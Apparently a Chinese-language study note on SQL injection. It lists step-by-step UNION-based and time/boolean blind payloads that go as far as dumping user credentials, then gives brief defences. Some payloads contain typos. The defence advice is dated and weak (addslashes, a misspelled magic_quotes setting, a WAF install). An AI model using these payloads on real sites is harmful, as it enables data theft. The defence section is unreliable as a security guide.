### 一、 普通sql注入：

1、探测 是否存在sql注入
构造url：uri？id=55 and 1=1
uri？id=55 and 1=2
猜测服务器端拼接的查询

2、查看字段数，假设只有15列
uri？ id=55 order by 16     -----查不出来

3、获取数据库名
uri？id =-55 union select 1，2，database（），4，5，6，..(可以是任意系统信息函数)...15

4、数据库名拿到后，假如为news,查出该数据库的所有表名的16进制形式
uri？ id =-55 union select 1，2，hex（group_concat(TABLE_NAME)）,4,5
,6,7....15 from information_schema.tables where TABLE_SCHEMA='news'

5、16进制转字符串可以看见所有按逗号分隔的表名

6、获取表news_users的字段名
uri：id=-55 union select 1，2，hex（group_concat（column_name））,4,.......15
from information_schema.columns where table_schema='news' and table_name='news_users'

7、拖库  假设查出的字段名有username和userpassword
uri：id=-55 union select 1，2，hex（group_concat(username,userpasssword)）,.....15
from news.news_users




### 二、sql盲注

1、尝试是否存在注入点：
uri:id=55 and if(1=1,1,sleep(5)) 
uri：id=55 and if(1=2,1,sleep(5))
查看访问时间差，如果存在5秒左右说明存在注入点


2、获取数据库的长度
尝试：
uri：id=55 and length（database（））=1
-------------------------------------2
--------------------------------------。。。。
--------------------------------------页面正常显示为止


3、获取数据库的名字
uri：id=55 and ord（substr（database（），1，1））=0               
ord和ascii函数一样都是获取字符串第一个字符的ascii值。
直到试到页面正常显示为止，得到第一个字符。
以此类推获得数据库名

4、获取数据表名
假设上一步获取到的数据库名为news
获取数据表名
select group_concat(table_name) form information_schema.tables where table_schema='news'
uri：id=55 and ord（substr（数据表名，1，1））=0




5、获取字段名
select conlumn_name from information_schema.columns where table_schema='news' and table_name='表名'
uri：id=55 and ord（substr（字段名），1，1）=0


6、托库：
select 字段名 from news.表名 
uri：id=55 and ord（substr（字段值），1，1）=0

### 三、sql注入防护

一、代码层面
intval函数：
addslashes（）：在单引号或双引号前面加一个\

二、从服务器配置层面进行防御
php.ini文件中开启：magic_quotes_gps=On 开启注入防御（大于5.3版本的php不支持,5.3以前的版本会自动开启这个配置项）同时他只能防御字符型sql注入，不能防御数字型sql注入。

三、使用WAF进行sql注入防御
WAF：Web Application Firewall web应用防火墙
网络安全狗safedog
1、下载安全狗安装程序
2、停止并退出phpstudy
3、以管理员身份运行phpstudy
4、运行模式设为系统模式
5、开启安全狗



